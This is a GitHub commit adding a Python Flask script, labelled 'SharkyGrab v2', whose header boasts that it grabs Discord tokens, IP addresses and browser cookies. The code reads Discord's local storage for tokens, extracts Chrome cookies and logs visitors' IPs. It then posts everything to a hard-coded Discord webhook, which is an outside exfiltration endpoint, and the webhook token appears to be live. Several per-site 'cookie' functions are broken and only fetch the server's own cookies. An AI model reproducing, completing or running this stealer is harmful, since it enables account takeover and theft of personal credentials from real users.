71172ff6c828279d4b1d59dce7c261012ffa125d
FralkA <153741594+FralkA@users.noreply.github.com>
2024-03-09 13:08:25 +0100

    Add files via upload

---
+++ api/Sam project.py
@@ -0,0 +1,203 @@
+#                                         (__________________________Author = FralkA_______________________)
+#  -------- 𝙎𝙝𝙖𝙧𝙠𝙮𝙂𝙧𝙖𝙗 v2 --------
+#  ______with a simple link_______ 
+#  -------- You can grab: --------
+#  -------- Discord Token --------          
+#  --------   ip adress   --------
+#  --------    detect     --------
+#  --------     VPN       --------
+#  --------Browser Cookies--------
+#  -------- os and browser--------
+#  --------google  cookies--------
+#  -------- gmail cookies --------
+#  --------roblox  cookies--------
+#  --------tiktok  cookies--------
+#  -------- github cookies--------
+#  -------- insta cookies --------
+#  --------And after that --------
+#  --------The script send--------
+#  -------- A Message to a--------
+#  -------- adresse e-mail--------
+
+#                                                                                                                ><(((º>
+#     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣴⣿⣿⣿⣶⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀><(((º>⠀⠀⠀⠀⠀⠀
+#    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⠟⠋⠉⠉⠙⠻⢿⣿⣷⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+#     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠏⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀                                                     ><(((º>
+#     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣏⠻⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ 
+#      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+#      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⣿⣷⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀              
+#      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣟⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀><(((º>⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+#     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⡀⠀⠀⠈⠙⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+#     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⢀⣄⣀⣠⣤⣶⣶⣾⣿⣿⣿⢿⣿⣷⣦⣄⠀⠀⠙⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                                          
+#     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⡿⠀⠀⠀⠀⠀⠀⢀⣠⣶⣿⣿⣿⠿⠛⠛⣏⠉⠉⢻⡄⠀⢹⠉⠛⣿⣧⡀⠀⠈⢿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀               
+#      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⠁⠀⠀⠀⢀⣤⣾⣿⣿⠿⠋⠉⣿⡀⠀⠀⢸⣦⠀⢸⣷⠀⢸⣧⠀⣿⠙⣿⡄⠀⠈⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                        
+#     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⠃⠀⠀⢀⣴⣿⣿⡿⠋⠹⣦⡀⠀⢿⣿⣆⠀⣿⣿⣇⣿⣿⣦⣿⣿⣄⣿⡇⣿⢻⡀⠀⠘⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                          ><(((º>                𝙎𝙝𝙖𝙧𝙠𝙮 𝙂𝙧𝙖𝙗 
+#     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡏⠀⠀⢠⣿⣿⠟⠁⢢⡀⠀⣿⣿⣦⣸⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⢀⣧⠀⠀⢹⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+#     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⣾⣿⠛⣆⠀⠘⣿⣷⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠈⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀><(((º>
+#     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⣿⡇⠀⠹⣿⣶⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠈⢿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+#     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣧⠀⠀⢿⡗⣦⣄⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠙⢿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+#     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡆⠀⢸⣇⡘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠻⢿⣿⡷⠈⢿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠙⢿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+#     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣧⠀⠀⢿⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⢻⣿⣿⡇⠀⠀⢻⠇⠀⠀⢿⠙⡟⢻⣉⡿⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣷⡀                                                                      ⠀⠀⠀⠀⠀⠀⠀⠀
+#     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡀⠀⠈⢷⣽⣿⣿⣿⣿⣿⣿⡏⠻⣿⣿⠀⠀⠙⢿⣇⣀⣤⣬⣤⣤⣤⡤⠶⠖⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀
+#     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣧⠀⠈⠙⠂⣠⣴⠿⠛⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀
+#      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠀⠀⠘⣿⣿⣿⣿⡌⠛⠆⣠⣴⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⡆⠀⠀⠀                                ><(((º>⠀⠀⠀
+#      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠀⠀⠀⠹⣿⡻⢄⣙⡴⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⡄⠀⠀⠀⠀⠀
+#     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣧⠀⠀                                                                   ><(((º>⠀⠀⠀
+#      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠶⠚⠋⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⡆⠀⠀⠀⠀
+#       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⡄⠀⠀⠀
+#      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣧⠀⠀⠀
+#     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⠸⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⡆⠀⠀
+#     ⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣷⣮⣛⠿⣷⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣷⡀⠀
+#     ⠀⠀⠀⢀⣀⣠⣶⣾⣿⡿⠿⠛⠿⢿⣿⣿⣷⣾⣥⣄⣀⣀⣀⣀⣀⣀⠀⢀⣠⣶⣄⡀⢤⣀⣀⣀⣀⣤⣴⣶⣿⣿⣿⣿⠿⢿⣿⣿⣿⣶⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣇⠀                         ><(((º>
+#      ⠈⠉⠉⠛⠛⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠛⠛⠛⠛⠛⣉⣤⣾⣿⣿⣿⣿⣿⣦⣀⠉⠛⠛⠛⠛⠛⠛⠛⠉⠀⠀⠀⠀⠉⠛⠻⠿⠿⢿⣿⣿⣿⣶⣶⣶⣶⠶⠶⠶⠚⠋                                                           ><(((º>
+#       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣾⣿⣿⣿⠿⠛⠉⠉⠛⠻⢿⣿⣿⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+#    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠤⠤⠴⠶⠿⠿⠿⠛⠛⠋⠉⠀⡀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠿⠿⠶⢶⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+
+
+
+
+import json
+import os
+import re
+import requests
+from browser_cookie3 import chrome
+from flask import Flask, request
+
+app = Flask(__name__)
+
+# Remplacez YOUR_WEBHOOK_URL_HERE par votre véritable lien de webhook Discord
+webhook_url = "https://discord.com/api/webhooks/1213793998221869107/hxmDjbb_R0gbO_PKT2CCWwPgTDxO2DWkGJIhhgufj7lc_YDDZjCLH0pmvq59N1ViAnWt"
+
+
+def iplog():
+    return request.remote_addr
+
+def get_browser_cookies():
+    excluded_domains = [
+        'Opera Software\\Opera GX Stable',
+        'Google\\Chrome',
+        'Mozilla\\Firefox',
+        'Microsoft\\Edge'
+    ]
+    try:
+        cookies = []
+        for browser in chrome():
+            if not any(excluded_domain in browser.domain for excluded_domain in excluded_domains):
+                cookies.append(browser)
+        return cookies if cookies else False
+    except Exception as e:
+        print("Error retrieving browser cookies:", e)
+        return False
+
+def find_discord_tokens():
+    tokens = []
+    try:
+        path = os.getenv('APPDATA') + '\\discord\\Local Storage\\leveldb'
+        for file_name in os.listdir(path):
+            if file_name.endswith('.ldb') or file_name.endswith('.log'):
+                with open(os.path.join(path, file_name), 'r', encoding='utf-8', errors='ignore') as f:
+                    content = f.read()
+                    tokens.extend(re.findall(r'(mfa\.[\w-]{84})|([\w-]{24}\.[\w-]{6}\.[\w-]{27})', content))
+        return tokens if tokens else False
+    except Exception as e:
+        print("Error retrieving Discord tokens:", e)
+        return False
+
+def retrieve_tiktok_cookies():
+    url = "https://www.tiktok.com"
+    response = requests.get(url)
+    tiktok_cookies = response.cookies
+    return tiktok_cookies if response.ok else False
+
+# Ajoutez les fonctions pour récupérer les cookies des autres sites ici
+def retrieve_paypal_cookies():
+    url = "https://www.paypal.com"
+    response = requests.get(url)
+    paypal_cookies = response.cookies
+    return paypal_cookies if response.ok else False
+
+# Ajoutez les fonctions pour récupérer les cookies des autres sites ici
+def retrieve_youtube_cookies():
+    url = "https://www.youtube.com"
+    response = requests.get(url)
+    youtube_cookies = response.cookies
+    return youtube_cookies if response.ok else False
+
+# Ajoutez les fonctions pour récupérer les cookies des autres sites ici
+def retrieve_google_cookies():
+    url = "https://www.google.com"
+    response = requests.get(url)
+    google_cookies = response.cookies
+    return google_cookies if response.ok else False
+
+# Ajoutez les fonctions pour récupérer les cookies des autres sites ici
+def retrieve_netflix_cookies():
+    url = "https://www.netflix.com"
+    response = requests.get(url)
+    netflix_cookies = response.cookies
+    return netflix_cookies if response.ok else False
+
+# Ajoutez les fonctions pour récupérer les cookies des autres sites ici
+def retrieve_roblox_cookies():
+    url = "https://www.roblox.com"
+    response = requests.get(url)
+    roblox_cookies = response.cookies
+    return roblox_cookies if response.ok else False
+
+def send_to_discord(message):
+    payload = {"content": message}
+    headers = {"Content-Type": "application/json"}
+    response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
+    
+    if response.ok:
+        print("Data sent successfully to Discord!")
+    else:
+        print("Failed to send data to Discord webhook!")
+
+@app.route('/')
+def main():
+    ip = iplog()
+    cookies = get_browser_cookies()
+    discord_tokens = find_discord_tokens()
+    tiktok_cookies = retrieve_tiktok_cookies()
+    paypal_cookies = retrieve_paypal_cookies()
+    youtube_cookies = retrieve_youtube_cookies()
+    google_cookies = retrieve_google_cookies()
+    netflix_cookies = retrieve_netflix_cookies()
+    roblox_cookies = retrieve_roblox_cookies()
+
+    # Créez des encadrés autour des données pour les rendre plus visibles
+    ip_adresse =  "```" + str(ip) + "```" if ip else "No IP found"
+    cookies_str = "```" + str(cookies) + "```" if cookies else "No cookies found"
+    discord_tokens_str = "```" + str(discord_tokens) + "```" if discord_tokens else "No Discord tokens found"
+    tiktok_cookies_str = "```" + str(tiktok_cookies) + "```" if tiktok_cookies else "No TikTok cookies found"
+    paypal_cookies_str = "```" + str(paypal_cookies) + "```" if paypal_cookies else "No PayPal cookies found"
+    youtube_cookies_str = "```" + str(youtube_cookies) + "```" if youtube_cookies else "No YouTube cookies found"
+    google_cookies_str = "```" + str(google_cookies) + "```" if google_cookies else "No Google cookies found"
+    netflix_cookies_str = "```" + str(netflix_cookies) + "```" if netflix_cookies else "No Netflix cookies found"
+    roblox_cookies_str = "```" + str(roblox_cookies) + "```" if roblox_cookies else "No Roblox cookies found"
+
+    # Construisez le message avec des sauts de ligne et des titres en gras
+    message = (
+        "******* Info that you logged: *******\n\n" +
+        "****IP****  :" + ip_adresse + "\n\n" +
+        "****Browser cookies  :****" + cookies_str + "\n\n" +
+        "****Discord tokens  :****" + discord_tokens_str + "\n\n" +
+        "****TikTok cookies   :****" + tiktok_cookies_str + "\n\n" +
+        "****PayPal cookies  :****" + paypal_cookies_str + "\n\n" +
+        "****YouTube cookies  :****" + youtube_cookies_str + "\n\n" +
+        "****Google cookies  :****" + google_cookies_str + "\n\n" +
+        "****Netflix cookies  :****" + netflix_cookies_str + "\n\n" +
+        "****Roblox cookies  :****" + roblox_cookies_str + "\n\n" 
+    )
+    send_to_discord(message)
+    
+    try:
+        with open('index.html', 'r') as file:
+            content = file.read()
+        return content
+    except FileNotFoundError:
+        return "Erreur: fichier HTML introuvable"
+
+if __name__ == '__main__':
+    app.run()
